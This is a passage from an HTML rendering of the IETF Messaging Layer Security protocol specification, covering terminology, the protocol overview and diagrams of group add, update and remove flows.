Channels implementing the Double Ratchet enjoy fine-grained forward secrecy
as well as post-compromise security, but are nonetheless efficient
enough for heavy use over low-bandwidth networks.<a href="#section-1-1">¬∂</a></p>
<p id="section-1-2">For a group of size greater than two, a common strategy is to
distribute symmetric "sender keys" over existing 1:1
secure channels, and then for each member to send messages to the
group encrypted with their own sender key. On the one hand, using sender keys
improves efficiency relative to pairwise transmission of individual messages, and
it provides forward secrecy (with the addition of a hash ratchet).
On the other hand, it is difficult to achieve post-compromise security with
sender keys, requiring a number of key update messages that scales as the square
of the group size.
An adversary who learns a sender key can often indefinitely and
passively eavesdrop on that member's messages.  Generating and
distributing a new sender key provides a form of post-compromise
security with regard to that sender.  However, it requires
computation and communications resources that scale linearly with
the size of the group.<a href="#section-1-2">¬∂</a></p>
<p id="section-1-3">In this document, we describe a protocol based on tree structures
that enables asynchronous group keying with forward secrecy and
post-compromise security.  Based on earlier work on "asynchronous
ratcheting trees" <span>[<a href="#ART">ART</a>]</span>, the protocol presented here uses an
asynchronous key-encapsulation mechanism for tree structures.
This mechanism allows the members of the group to derive and update
shared keys with costs that scale as the log of the group size.<a href="#section-1-3">¬∂</a></p>
</section>
<section id="terminology">
      <h2 id="name-terminology">
<a href="#section-2">2. </a><a href="#name-terminology">Terminology</a>
      </h2>
<p id="section-2-1">The key words "<span>MUST</span>", "<span>MUST NOT</span>", "<span>REQUIRED</span>", "<span>SHALL</span>", "<span>SHALL NOT</span>",
"<span>SHOULD</span>", "<span>SHOULD NOT</span>", "<span>RECOMMENDED</span>", "<span>NOT RECOMMENDED</span>", "<span>MAY</span>", and
"<span>OPTIONAL</span>" in this document are to be interpreted as described in
BCP 14 <span>[<a href="#RFC2119">RFC2119</a>]</span> <span>[<a href="#RFC8174">RFC8174</a>]</span> when, and only when, they appear in all
      capitals, as shown here.<a href="#section-2-1">¬∂</a></p>
<span></span><dl id="section-2-2">
        <dt id="section-2-2.1">Client:</dt>
        <dd id="section-2-2.2">An agent that uses this protocol to establish shared cryptographic
state with other clients.  A client is defined by the
cryptographic keys it holds.<a href="#section-2-2.2">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.3">Group:</dt>
        <dd id="section-2-2.4">A group represents a logical collection of clients that share a common
secret value at any given time.  Its state is represented as a linear
sequence of epochs in which each epoch depends on its predecessor.<a href="#section-2-2.4">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.5">Epoch:</dt>
        <dd id="section-2-2.6">A state of a group in which a specific set of authenticated clients hold
shared cryptographic state.<a href="#section-2-2.6">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.7">Member:</dt>
        <dd id="section-2-2.8">A client that is included in the shared state of a group and hence
has access to the group's secrets.<a href="#section-2-2.8">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.9">Key Package:</dt>
        <dd id="section-2-2.10">A signed object describing a client's identity and capabilities, including
a hybrid public key encryption (HPKE) <span>[<a href="#RFC9180">RFC9180</a>]</span> public key that
can be used to encrypt to that client. Other clients can use a client's
KeyPackage to introduce the client to a new group.<a href="#section-2-2.10">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.11">Group Context:</dt>
        <dd id="section-2-2.12">An object that summarizes the shared, public state of the group. The group
context is typically distributed in a signed GroupInfo message, which is provided
to new members to help them join a group.<a href="#section-2-2.12">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.13">Signature Key:</dt>
        <dd id="section-2-2.14">A signing key pair used to authenticate the sender of a message.<a href="#section-2-2.14">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.15">Proposal:</dt>
        <dd id="section-2-2.16">A message that proposes a change to the group, e.g., adding or removing a
member.<a href="#section-2-2.16">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.17">Commit:</dt>
        <dd id="section-2-2.18">A message that implements the changes to the group proposed in a set of
Proposals.<a href="#section-2-2.18">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.19">PublicMessage:</dt>
        <dd id="section-2-2.20">An MLS protocol message that is signed by its sender and authenticated as
coming from a member of the group in a particular epoch, but not encrypted.<a href="#section-2-2.20">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.21">PrivateMessage:</dt>
        <dd id="section-2-2.22">An MLS protocol message that is signed by its sender, authenticated as
coming from a member of the group in a particular epoch, and encrypted so
that it is confidential to the members of the group in that epoch.<a href="#section-2-2.22">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.23">Handshake Message:</dt>
        <dd id="section-2-2.24">A PublicMessage or PrivateMessage carrying an MLS Proposal or Commit
object, as opposed to application data.<a href="#section-2-2.24">¬∂</a>
</dd>
        <dd></dd>
<dt id="section-2-2.25">Application Message:</dt>
        <dd id="section-2-2.26">A PrivateMessage carrying application data.<a href="#section-2-2.26">¬∂</a>
</dd>
      <dd></dd>
</dl>
<p id="section-2-3">Terminology specific to tree computations is described in
<a href="#ratchet-tree-terminology">Section 4.1</a>.<a href="#section-2-3">¬∂</a></p>
<p id="section-2-4">In general, symmetric values are referred to as "keys" or "secrets"
interchangeably.  Either term denotes a value that <span>MUST</span> be kept confidential to
a client.  When labeling individual values, we typically use "secret" to refer
to a value that is used to derive further secret values and "key" to refer to a
value that is used with an algorithm such as Hashed Message Authentication Code
(HMAC) or an Authenticated Encryption with Associated Data (AEAD) algorithm.<a href="#section-2-4">¬∂</a></p>
<p id="section-2-5">The PublicMessage and PrivateMessage formats are defined in <a href="#message-framing">Section 6</a>.
Security notions such as forward secrecy and post-compromise
security are defined in <a href="#security-considerations">Section 16</a>.<a href="#section-2-5">¬∂</a></p>
<p id="section-2-6">As detailed in <a href="#grease">Section 13.5</a>, MLS uses the "Generate Random Extensions And Sustain
Extensibility" (GREASE) approach to maintaining extensibility, where senders insert random
values into fields in which receivers are required to ignore unknown values.
Specific "GREASE values" for this purpose are registered in the appropriate IANA
registries.<a href="#section-2-6">¬∂</a></p>
<section id="presentation-language">
        <h3 id="name-presentation-language">
<a href="#section-2.1">2.1. </a><a href="#name-presentation-language">Presentation Language</a>
        </h3>
<p id="section-2.1-1">We use the TLS presentation language <span>[<a href="#RFC8446">RFC8446</a>]</span> to describe the structure of
protocol messages.  In addition to the base syntax, we add two additional
features: the ability for fields to be optional and the ability for vectors to
have variable-size length headers.<a href="#section-2.1-1">¬∂</a></p>
<section id="optional-value">
          <h4 id="name-optional-value">
<a href="#section-2.1.1">2.1.1. </a><a href="#name-optional-value">Optional Value</a>
          </h4>
<p id="section-2.1.1-1">An optional value is encoded with a presence-signaling octet, followed by the
value itself if present.  When decoding, a presence octet with a value other
than 0 or 1 <span>MUST</span> be rejected as malformed.<a href="#section-2.1.1-1">¬∂</a></p>
<div id="section-2.1.1-2">
<pre>struct {
    uint8 present;
    select (present) {
        case 0: struct{};
        case 1: T value;
    };
} optional&lt;T&gt;;
</pre><p><a href="#section-2.1.1-2">¬∂</a>
</p></div>
</section>

</section>
</section>
<section id="protocol-overview">
      <h2 id="name-protocol-overview">
<a href="#section-3">3. </a><a href="#name-protocol-overview">Protocol Overview</a>
      </h2>
<p id="section-3-1">MLS is designed to operate in the context described in
<span>[<a href="#I-D.ietf-mls-architecture">MLS-ARCH</a>]</span>. In particular, we assume that the following
services are provided:<a href="#section-3-1">¬∂</a></p>
<ul>
<li id="section-3-2.1">An Authentication Service (AS) that enables group members to authenticate the
credentials presented by other group members.<a href="#section-3-2.1">¬∂</a>
</li>
        <li id="section-3-2.2">A Delivery Service (DS) that routes MLS messages among the participants in the
protocol.<a href="#section-3-2.2">¬∂</a>
</li>
      </ul>
<p id="section-3-3">MLS assumes a trusted AS but a largely untrusted DS. <a href="#authentication-service-compromise">Section 16.10</a>
describes the impact of compromise or
misbehavior of an AS. MLS is designed to protect the confidentiality and integrity of
the group data even in the face of a compromised DS;
in general, the DS is only expected to reliably deliver messages.
<a href="#delivery-service-compromise">Section 16.9</a> describes the impact of compromise or
misbehavior of a DS.<a href="#section-3-3">¬∂</a></p>
<p id="section-3-4">The core functionality of MLS is continuous group authenticated key exchange
(AKE).  As with other authenticated key exchange protocols (such as TLS), the
participants in the protocol agree on a common secret value, and each
participant can verify the identity of the other participants. That secret
can then be used to protect messages sent from one participant in the
group to the other participants using the MLS framing layer
or can be exported for use with other protocols. MLS provides
group AKE in the sense that there can be more than two participants in the
protocol, and continuous group AKE in the sense that the set of participants in
the protocol can change over time.<a href="#section-3-4">¬∂</a></p>
<p id="section-3-5">The core organizing principles of MLS are <em>groups</em> and <em>epochs</em>.  A group
represents a logical collection of clients that share a common secret value at
any given time.  The history of a group is divided into a linear sequence of
epochs.  In each epoch, a set of authenticated <em>members</em> agree on an <em>epoch
secret</em> that is known only to the members of the group in that epoch.  The set
of members involved in the group can change from one epoch to the next, and MLS
ensures that only the members in the current epoch have access to the epoch
secret.  From the epoch secret, members derive further shared secrets for
message encryption, group membership authentication, and so on.<a href="#section-3-5">¬∂</a></p>
<p id="section-3-6">The creator of an MLS group creates the group's first epoch unilaterally, with
no protocol interactions.  Thereafter, the members of the group advance their
shared cryptographic state from one epoch to another by exchanging MLS messages.<a href="#section-3-6">¬∂</a></p>
<ul>
<li id="section-3-7.1">A <em>KeyPackage</em> object describes a client's capabilities and provides keys that
can be used to add the client to a group.<a href="#section-3-7.1">¬∂</a>
</li>
        <li id="section-3-7.2">A <em>Proposal</em> message proposes a change to be made in the next epoch, such as
adding or removing a member.<a href="#section-3-7.2">¬∂</a>
</li>
        <li id="section-3-7.3">A <em>Commit</em> message initiates a new epoch by instructing members of the group
to implement a collection of proposals.<a href="#section-3-7.3">¬∂</a>
</li>
        <li id="section-3-7.4">A <em>Welcome</em> message provides a new member to the group with the information to
initialize their state for the epoch in which they were added or in which they
want to add themselves to the group.<a href="#section-3-7.4">¬∂</a>
</li>
      </ul>
<p id="section-3-8">KeyPackage and Welcome messages are used to initiate a group or introduce new
members, so they are exchanged between group members and clients not yet in the
group. A client publishes a KeyPackage via the DS, thus enabling other
clients to add it to groups. When a group member wants to add a new member to a
group, it uses the new member's KeyPackage to add them and constructs a Welcome
message with which the new member can initialize their local state.<a href="#section-3-8">¬∂</a></p>
<p id="section-3-9">Proposal and Commit messages are sent from one member of a group to the others.
MLS provides a common framing layer for sending messages within a group:
A <em>PublicMessage</em> provides sender authentication for unencrypted Proposal and Commit
messages.  A <em>PrivateMessage</em> provides encryption and authentication for
both Proposal/Commit messages as well as any application data.<a href="#section-3-9">¬∂</a></p>
<section id="cryptographic-state-and-evolution">
        <h3 id="name-cryptographic-state-and-evo">
<a href="#section-3.1">3.1. </a><a href="#name-cryptographic-state-and-evo">Cryptographic State and Evolution</a>
        </h3>
<p id="section-3.1-1">The cryptographic state at the core of MLS is divided into three areas of responsibility:<a href="#section-3.1-1">¬∂</a></p>
<span id="name-overview-of-mls-group-evolu"></span><figure id="figure-1">
          <div id="section-3.1-2.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="400" text-anchor="middle" version="1.1" viewBox="0 0 584 400" width="584">
                <path d="M 8,128 L 8,288" fill="none" stroke="black"></path>
                <path d="M 208,48 L 208,200" fill="none" stroke="black"></path>
                <path d="M 208,216 L 208,368" fill="none" stroke="black"></path>
                <path d="M 272,64 L 272,96" fill="none" stroke="black"></path>
                <path d="M 272,120 L 272,192" fill="none" stroke="black"></path>
                <path d="M 272,216 L 272,288" fill="none" stroke="black"></path>
                <path d="M 272,312 L 272,352" fill="none" stroke="black"></path>
                <path d="M 336,48 L 336,200" fill="none" stroke="black"></path>
                <path d="M 336,216 L 336,368" fill="none" stroke="black"></path>
                <path d="M 576,128 L 576,288" fill="none" stroke="black"></path>
                <path d="M 48,208 L 72,208" fill="none" stroke="black"></path>
                <path d="M 200,208 L 216,208" fill="none" stroke="black"></path>
                <path d="M 336,208 L 352,208" fill="none" stroke="black"></path>
                <path d="M 512,208 L 528,208" fill="none" stroke="black"></path>
                <path d="M 8,128 L 48,208" fill="none" stroke="black"></path>
                <path d="M 536,208 L 576,288" fill="none" stroke="black"></path>
                <path d="M 8,288 L 48,208" fill="none" stroke="black"></path>
                <path d="M 536,208 L 576,128" fill="none" stroke="black"></path>
                <path d="M 224,32 C 215.16936,32 208,39.16936 208,48" fill="none" stroke="black"></path>
                <path d="M 320,32 C 328.83064,32 336,39.16936 336,48" fill="none" stroke="black"></path>
                <path d="M 224,384 C 215.16936,384 208,376.83064 208,368" fill="none" stroke="black"></path>
                <path d="M 320,384 C 328.83064,384 336,376.83064 336,368" fill="none" stroke="black"></path>
                <polygon fill="black" points="536,208 524,202.4 524,213.6" transform="rotate(0,528,208)"></polygon>
                <polygon fill="black" points="360,208 348,202.4 348,213.6" transform="rotate(0,352,208)"></polygon>
                <polygon fill="black" points="280,352 268,346.4 268,357.6" transform="rotate(90,272,352)"></polygon>
                <polygon fill="black" points="280,288 268,282.4 268,293.6" transform="rotate(90,272,288)"></polygon>
                <polygon fill="black" points="280,192 268,186.4 268,197.6" transform="rotate(90,272,192)"></polygon>
                <polygon fill="black" points="280,96 268,90.4 268,101.6" transform="rotate(90,272,96)"></polygon>
                <polygon fill="black" points="224,208 212,202.4 212,213.6" transform="rotate(0,216,208)"></polygon>
                <polygon fill="black" points="80,208 68,202.4 68,213.6" transform="rotate(0,72,208)"></polygon>
                <g>
                  <text x="272" y="36">...</text>
                  <text x="360" y="84">Key</text>
                  <text x="412" y="84">Schedule</text>
                  <text x="276" y="116">epoch_secret</text>
                  <text x="56" y="148">Ratchet</text>
                  <text x="532" y="148">Secret</text>
                  <text x="52" y="164">Tree</text>
                  <text x="532" y="164">Tree</text>
                  <text x="136" y="212">commit_secret</text>
                  <text x="276" y="212">epoch_secret</text>
                  <text x="432" y="212">encryption_secret</text>
                  <text x="276" y="308">epoch_secret</text>
                  <text x="272" y="388">...</text>
                </g>
              </svg><p><a href="#section-3.1-2.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-1">Figure 1</a>:
<a href="#name-overview-of-mls-group-evolu">Overview of MLS Group Evolution</a>
          </figcaption></figure>
<ul>
<li id="section-3.1-3.1">A <em>ratchet tree</em> that represents the membership of the group, providing group
members a way to authenticate each other and efficiently encrypt messages to
subsets of the group.  Each epoch has a distinct ratchet tree. It seeds the
<em>key schedule</em>.<a href="#section-3.1-3.1">¬∂</a>
</li>
          <li id="section-3.1-3.2">
            <p id="section-3.1-3.2.1">A <em>key schedule</em> that describes the chain of key derivations used to progress from
epoch to epoch (mainly using the <em>init_secret</em> and <em>epoch_secret</em>), as well as the derivation of
a variety of other secrets (see <a href="#epoch-derived-secrets">Table 4</a>). For example:<a href="#section-3.1-3.2.1">¬∂</a></p>
<ul>
<li id="section-3.1-3.2.2.1">An <em>encryption secret</em> that is used to initialize the secret tree for the
epoch.<a href="#section-3.1-3.2.2.1">¬∂</a>
</li>
              <li id="section-3.1-3.2.2.2">An <em>exporter secret</em> that allows other protocols to leverage MLS as a
generic authenticated group key exchange.<a href="#section-3.1-3.2.2.2">¬∂</a>
</li>
              <li id="section-3.1-3.2.2.3">A <em>resumption secret</em> that members can use to prove their membership in the
group, e.g., when creating a subgroup or a successor group.<a href="#section-3.1-3.2.2.3">¬∂</a>
</li>
            </ul>
</li>
          <li id="section-3.1-3.3">A <em>secret tree</em> derived from the key schedule that represents shared secrets
used by the members of the group for encrypting and authenticating messages.
Each epoch has a distinct secret tree.<a href="#section-3.1-3.3">¬∂</a>
</li>
        </ul>
<p id="section-3.1-4">Each member of the group maintains a partial view of these components of the group's
state.  MLS messages are used to initialize these views and keep them in sync as
the group transitions between epochs.<a href="#section-3.1-4">¬∂</a></p>
<p id="section-3.1-5">Each new epoch is initiated with a Commit message.  The Commit instructs
existing members of the group to update their views of the ratchet tree by applying
a set of Proposals, and uses the updated ratchet tree to distribute fresh
entropy to the group.  This fresh entropy is provided only to members in the new
epoch and not to members who have been removed. Commits thus maintain the property that
the epoch secret is confidential to the members in the current epoch.<a href="#section-3.1-5">¬∂</a></p>
<p id="section-3.1-6">For each Commit that adds one or more members to the group, there are one or more corresponding
Welcome messages.  Each Welcome message provides new members with the information
they need to initialize their views of the key schedule and ratchet tree, so
that these views align with the views held by other members of the group
in this epoch.<a href="#section-3.1-6">¬∂</a></p>
</section>
<section id="example-protocol-execution">
        <h3 id="name-example-protocol-execution">
<a href="#section-3.2">3.2. </a><a href="#name-example-protocol-execution">Example Protocol Execution</a>
        </h3>
<p id="section-3.2-1">There are three major operations in the life of a group:<a href="#section-3.2-1">¬∂</a></p>
<ul>
<li id="section-3.2-2.1">Adding a member, initiated by a current member;<a href="#section-3.2-2.1">¬∂</a>
</li>
          <li id="section-3.2-2.2">Updating the keys that represent a member in the tree; and<a href="#section-3.2-2.2">¬∂</a>
</li>
          <li id="section-3.2-2.3">Removing a member.<a href="#section-3.2-2.3">¬∂</a>
</li>
        </ul>
<p id="section-3.2-3">Each of these operations is "proposed" by sending a message of the corresponding
type (Add / Update / Remove).  The state of the group is not changed, however,
until a Commit message is sent to provide the group with fresh entropy.  In this
section, we show each proposal being committed immediately, but in more advanced
deployment cases, an application might gather several proposals before
committing them all at once.  In the illustrations below, we show the Proposal
and Commit messages directly, while in reality they would be sent encapsulated in
PublicMessage or PrivateMessage objects.<a href="#section-3.2-3">¬∂</a></p>
<p id="section-3.2-4">Before the initialization of a group, clients publish KeyPackages to a directory
provided by the DS (see <a href="#prepublish-flow">Figure 2</a>).<a href="#section-3.2-4">¬∂</a></p>
<span id="name-clients-a-b-and-c-publish-k"></span><div id="prepublish-flow">
<figure id="figure-2">
          <div id="section-3.2-5.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="288" text-anchor="middle" version="1.1" viewBox="0 0 568 288" width="568">
                <path d="M 8,128 L 8,272" fill="none" stroke="black"></path>
                <path d="M 144,128 L 144,152" fill="none" stroke="black"></path>
                <path d="M 144,168 L 144,272" fill="none" stroke="black"></path>
                <path d="M 280,128 L 280,152" fill="none" stroke="black"></path>
                <path d="M 280,168 L 280,200" fill="none" stroke="black"></path>
                <path d="M 280,216 L 280,272" fill="none" stroke="black"></path>
                <path d="M 416,128 L 416,272" fill="none" stroke="black"></path>
                <path d="M 536,128 L 536,272" fill="none" stroke="black"></path>
                <path d="M 400,64 L 456,64" fill="none" stroke="black"></path>
                <path d="M 488,64 L 544,64" fill="none" stroke="black"></path>
                <path d="M 8,160 L 408,160" fill="none" stroke="black"></path>
                <path d="M 144,208 L 408,208" fill="none" stroke="black"></path>
                <path d="M 280,256 L 408,256" fill="none" stroke="black"></path>
                <path d="M 400,64 C 391.16936,64 384,71.16936 384,80" fill="none" stroke="black"></path>
                <path d="M 456,64 C 464.83064,64 472,56.83064 472,48" fill="none" stroke="black"></path>
                <path d="M 488,64 C 479.16936,64 472,56.83064 472,48" fill="none" stroke="black"></path>
                <path d="M 544,64 C 552.83064,64 560,71.16936 560,80" fill="none" stroke="black"></path>
                <polygon fill="black" points="416,256 404,250.4 404,261.6" transform="rotate(0,408,256)"></polygon>
                <polygon fill="black" points="416,208 404,202.4 404,213.6" transform="rotate(0,408,208)"></polygon>
                <polygon fill="black" points="416,160 404,154.4 404,165.6" transform="rotate(0,408,160)"></polygon>
                <g>
                  <text x="436" y="36">Delivery</text>
                  <text x="504" y="36">Service</text>
                  <text x="528" y="100">Group</text>
                  <text x="8" y="116">A</text>
                  <text x="144" y="116">B</text>
                  <text x="280" y="116">C</text>
                  <text x="416" y="116">Directory</text>
                  <text x="536" y="116">Channel</text>
                  <text x="64" y="148">KeyPackageA</text>
                  <text x="200" y="196">KeyPackageB</text>
                  <text x="336" y="244">KeyPackageC</text>
                </g>
              </svg><p><a href="#section-3.2-5.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-2">Figure 2</a>:
<a href="#name-clients-a-b-and-c-publish-k">Clients A, B, and C publish KeyPackages to the directory</a>
          </figcaption></figure>
</div>
<p id="section-3.2-6"><a href="#create-flow">Figure 3</a> shows how these pre-published KeyPackages are used to create a group.
When client A wants to establish a group with clients B and C, it first initializes a
group state containing only itself and downloads KeyPackages for B and C. For
each member, A generates an Add proposal and a Commit message to add that member and then
broadcasts the two messages to the group. Client A also generates a Welcome message and sends it
directly to the new member (there's no need to send it to the group). Only after
A has received its Commit message back from the Delivery Service does it update its
state to reflect the new member's addition.<a href="#section-3.2-6">¬∂</a></p>
<p id="section-3.2-7">Once A has updated its state, the new member has processed the Welcome, and any
other group members have processed the Commit, they will all have consistent
representations of the group state, including a group secret that is known only
to the members the group. The new member will be able to read and send new
messages to the group, but messages sent before they were added to the group
will not be accessible.<a href="#section-3.2-7">¬∂</a></p>
<span id="name-client-a-creates-a-group-wi"></span><div id="create-flow">
<figure id="figure-3">
          <div id="section-3.2-8.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="512" text-anchor="middle" version="1.1" viewBox="0 0 560 512" width="560">
                <path d="M 8,64 L 8,496" fill="none" stroke="black"></path>
                <path d="M 128,104 L 128,152" fill="none" stroke="black"></path>
                <path d="M 128,168 L 128,264" fill="none" stroke="black"></path>
                <path d="M 128,280 L 128,344" fill="none" stroke="black"></path>
                <path d="M 128,360 L 128,392" fill="none" stroke="black"></path>
                <path d="M 128,408 L 128,456" fill="none" stroke="black"></path>
                <path d="M 128,472 L 128,496" fill="none" stroke="black"></path>
                <path d="M 248,104 L 248,152" fill="none" stroke="black"></path>
                <path d="M 248,168 L 248,264" fill="none" stroke="black"></path>
                <path d="M 248,280 L 248,344" fill="none" stroke="black"></path>
                <path d="M 248,360 L 248,456" fill="none" stroke="black"></path>
                <path d="M 368,64 L 368,152" fill="none" stroke="black"></path>
                <path d="M 368,168 L 368,264" fill="none" stroke="black"></path>
                <path d="M 368,280 L 368,344" fill="none" stroke="black"></path>
                <path d="M 368,360 L 368,456" fill="none" stroke="black"></path>
                <path d="M 528,64 L 528,496" fill="none" stroke="black"></path>
                <path d="M 16,96 L 368,96" fill="none" stroke="black"></path>
                <path d="M 8,160 L 520,160" fill="none" stroke="black"></path>
                <path d="M 8,208 L 120,208" fill="none" stroke="black"></path>
                <path d="M 16,272 L 528,272" fill="none" stroke="black"></path>
                <path d="M 8,352 L 520,352" fill="none" stroke="black"></path>
                <path d="M 8,400 L 240,400" fill="none" stroke="black"></path>
                <path d="M 16,464 L 528,464" fill="none" stroke="black"></path>
                <path d="M 136,480 L 528,480" fill="none" stroke="black"></path>
                <polygon fill="black" points="528,352 516,346.4 516,357.6" transform="rotate(0,520,352)"></polygon>
                <polygon fill="black" points="528,160 516,154.4 516,165.6" transform="rotate(0,520,160)"></polygon>
                <polygon fill="black" points="248,400 236,394.4 236,405.6" transform="rotate(0,240,400)"></polygon>
                <polygon fill="black" points="144,480 132,474.4 132,485.6" transform="rotate(180,136,480)"></polygon>
                <polygon fill="black" points="128,208 116,202.4 116,213.6" transform="rotate(0,120,208)"></polygon>
                <polygon fill="black" points="24,464 12,458.4 12,469.6" transform="rotate(180,16,464)"></polygon>
                <polygon fill="black" points="24,272 12,266.4 12,277.6" transform="rotate(180,16,272)"></polygon>
                <polygon fill="black" points="24,96 12,90.4 12,101.6" transform="rotate(180,16,96)"></polygon>
                <g>
                  <text x="528" y="36">Group</text>
                  <text x="8" y="52">A</text>
                  <text x="128" y="52">B</text>
                  <text x="248" y="52">C</text>
                  <text x="368" y="52">Directory</text>
                  <text x="528" y="52">Channel</text>
                  <text x="128" y="68">|</text>
                  <text x="248" y="68">|</text>
                  <text x="132" y="84">KeyPackageB,</text>
                  <text x="232" y="84">KeyPackageC</text>
                  <text x="420" y="132">Add(A-&gt;AB)</text>
                  <text x="424" y="148">Commit(Add)</text>
                  <text x="68" y="196">Welcome(B)</text>
                  <text x="420" y="244">Add(A-&gt;AB)</text>
                  <text x="424" y="260">Commit(Add)</text>
                  <text x="428" y="324">Add(AB-&gt;ABC)</text>
                  <text x="424" y="340">Commit(Add)</text>
                  <text x="188" y="388">Welcome(C)</text>
                  <text x="428" y="436">Add(AB-&gt;ABC)</text>
                  <text x="424" y="452">Commit(Add)</text>
                  <text x="248" y="500">|</text>
                  <text x="368" y="500">|</text>
                </g>
              </svg><p><a href="#section-3.2-8.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-3">Figure 3</a>:
<a href="#name-client-a-creates-a-group-wi">Client A creates a group with clients B and C</a>
          </figcaption></figure>
</div>
<p id="section-3.2-9">Subsequent additions of group members proceed in the same way.  Any
member of the group can download a KeyPackage for a new client,
broadcast Add and Commit messages that the current group will use to update
their state, and send a Welcome message that the new client can use to
initialize its state and join the group.<a href="#section-3.2-9">¬∂</a></p>
<p id="section-3.2-10">To enforce the forward secrecy and post-compromise security of messages, each
member periodically updates the keys that represent them to the group.  A member
does this by sending a Commit (possibly with no proposals) or by sending an
Update message that is committed by another member (see <a href="#update-flow">Figure 4</a>).
Once the other members of
the group have processed these messages, the group's secrets will be unknown to
an attacker that had compromised the secrets corresponding to the sender's leaf in the tree.
At the end of the scenario shown in <a href="#update-flow">Figure 4</a>, the group has
post-compromise security with respect to both A and B.<a href="#section-3.2-10">¬∂</a></p>
<p id="section-3.2-11">Update messages <span>SHOULD</span> be sent at regular intervals of time as long as the group
is active, and members that don't update <span>SHOULD</span> eventually be removed from the
group. It's left to the application to determine an appropriate amount of time
between Updates. Since the purpose of sending an Update is to proactively
constrain a compromise window, the right frequency is usually on the order of
hours or days, not milliseconds. For example, an application might send an
Update each time a member sends an application message after receiving any
message from another member, or daily if no application messages are sent.<a href="#section-3.2-11">¬∂</a></p>
<p id="section-3.2-12">The MLS architecture recommends that MLS be operated over a secure transport
(see <span><a href="https://datatracker.ietf.org/doc/html/draft-ietf-mls-architecture-10#section-7.1">Section 7.1</a> of [<a href="#I-D.ietf-mls-architecture">MLS-ARCH</a>]</span>).  Such transport protocols
will typically provide functions such as congestion control that manage the
impact of an MLS-using application on other applications sharing the same
network.  Applications should take care that they do not send MLS messages at a
rate that will cause problems such as network congestion, especially if they are
not following the above recommendation (e.g., sending MLS directly over UDP instead).<a href="#section-3.2-12">¬∂</a></p>
<span id="name-client-b-proposes-to-update"></span><div id="update-flow">
<figure id="figure-4">
          <div id="section-3.2-13.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="304" text-anchor="middle" version="1.1" viewBox="0 0 528 304" width="528">
                <path d="M 8,64 L 8,288" fill="none" stroke="black"></path>
                <path d="M 128,64 L 128,120" fill="none" stroke="black"></path>
                <path d="M 128,136 L 128,200" fill="none" stroke="black"></path>
                <path d="M 128,248 L 128,288" fill="none" stroke="black"></path>
                <path d="M 248,64 L 248,88" fill="none" stroke="black"></path>
                <path d="M 248,152 L 248,200" fill="none" stroke="black"></path>
                <path d="M 248,264 L 248,288" fill="none" stroke="black"></path>
                <path d="M 368,64 L 368,88" fill="none" stroke="black"></path>
                <path d="M 368,168 L 368,200" fill="none" stroke="black"></path>
                <path d="M 488,64 L 488,288" fill="none" stroke="black"></path>
                <path d="M 128,96 L 480,96" fill="none" stroke="black"></path>
                <path d="M 16,128 L 488,128" fill="none" stroke="black"></path>
                <path d="M 136,144 L 488,144" fill="none" stroke="black"></path>
                <path d="M 256,160 L 488,160" fill="none" stroke="black"></path>
                <path d="M 8,208 L 480,208" fill="none" stroke="black"></path>
                <path d="M 16,240 L 488,240" fill="none" stroke="black"></path>
                <path d="M 136,256 L 488,256" fill="none" stroke="black"></path>
                <path d="M 256,272 L 488,272" fill="none" stroke="black"></path>
                <polygon fill="black" points="488,208 476,202.4 476,213.6" transform="rotate(0,480,208)"></polygon>
                <polygon fill="black" points="488,96 476,90.4 476,101.6" transform="rotate(0,480,96)"></polygon>
                <polygon fill="black" points="264,272 252,266.4 252,277.6" transform="rotate(180,256,272)"></polygon>
                <polygon fill="black" points="264,160 252,154.4 252,165.6" transform="rotate(180,256,160)"></polygon>
                <polygon fill="black" points="144,256 132,250.4 132,261.6" transform="rotate(180,136,256)"></polygon>
                <polygon fill="black" points="144,144 132,138.4 132,149.6" transform="rotate(180,136,144)"></polygon>
                <polygon fill="black" points="24,240 12,234.4 12,245.6" transform="rotate(180,16,240)"></polygon>
                <polygon fill="black" points="24,128 12,122.4 12,133.6" transform="rotate(180,16,128)"></polygon>
                <g>
                  <text x="488" y="36">Group</text>
                  <text x="8" y="52">A</text>
                  <text x="128" y="52">B</text>
                  <text x="184" y="52">...</text>
                  <text x="248" y="52">Z</text>
                  <text x="368" y="52">Directory</text>
                  <text x="496" y="52">Channel</text>
                  <text x="176" y="84">Update(B)</text>
                  <text x="248" y="116">|</text>
                  <text x="368" y="116">|</text>
                  <text x="416" y="116">Update(B)</text>
                  <text x="64" y="196">Commit(Upd)</text>
                  <text x="128" y="228">|</text>
                  <text x="248" y="228">|</text>
                  <text x="368" y="228">|</text>
                  <text x="424" y="228">Commit(Upd)</text>
                  <text x="368" y="292">|</text>
                </g>
              </svg><p><a href="#section-3.2-13.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-4">Figure 4</a>:
<a href="#name-client-b-proposes-to-update">Client B proposes to update its key, and client A commits the proposal</a>
          </figcaption></figure>
</div>
<p id="section-3.2-14">Members are removed from the group in a similar way, as shown in <a href="#remove-flow">Figure 5</a>.
Any member of the group can send a Remove proposal followed by a
Commit message.  The Commit message provides new entropy to all members of the
group except the removed member.  This new entropy is added to the epoch secret
for the new epoch so that it is not known to the removed member.
Note that this does not necessarily imply that any member
is actually allowed to evict other members; groups can
enforce access control policies on top of these
basic mechanisms.<a href="#section-3.2-14">¬∂</a></p>
<span id="name-client-z-removes-client-b-f"></span><div id="remove-flow">
<figure id="figure-5">
          <div id="section-3.2-15.1">
